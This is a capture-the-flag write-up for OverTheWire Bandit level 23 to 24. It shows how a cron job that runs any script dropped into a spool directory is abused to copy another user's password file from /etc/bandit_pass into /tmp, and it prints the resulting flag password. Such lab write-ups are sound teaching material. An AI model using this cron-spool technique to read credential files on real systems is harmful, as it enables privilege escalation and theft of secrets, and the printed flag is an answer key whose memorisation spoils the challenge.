#Bandit: Level 23 -> 24

##Goal
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

##Solution
1. SSH onto the server with the username bandit23

2. First we take a look at the cron job and shell script

   ```
   bandit22@melinda:/etc/cron.d$ cat cronjob_bandit24
     * * * * * bandit23 /usr/bin/cronjob_bandit24.sh  &> /dev/null
   bandit22@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
    #!/bin/bash
    myname=$(whoami)
    cd /var/spool/$myname
    echo "Executing and deleting all scripts in /var/spool/$myname:"
    for i in * .*;
    do
       if [ "$i" != "." -a "$i" != ".." ];
       then
          echo "Handling $i"
          timeout -s 9 60 "./$i"
          rm -f "./$i"
       fi
    done
   ```

3. So this script will execute all scripts in `/var/spool/bandit24` as the user that runs the cronjob, so all we need to do is use that to cat our password and put it into a place we can access

4. create a temporary folder and then using `chmod` make it writeable to `bandit24`

5. Then create the script below, remember to make it executable and put it into the `/var/spool/bandit24` directory

   ```
   #!/bin/bash
   myname=$(whoami)
   echo $myname > /tmp/jm27989/whoami
   cat /etc/bandit_pass/bandit24 > /tmp/jm27989/bandit24
   ```

6. which generates two files, one is a file that tells us who is running the cronjob (bandit24 as expected), and the password which we can now cat

   ```
   bandit23@melinda:/tmp/jm27989$ cat bandit24 
   UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
   ```

Flag: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
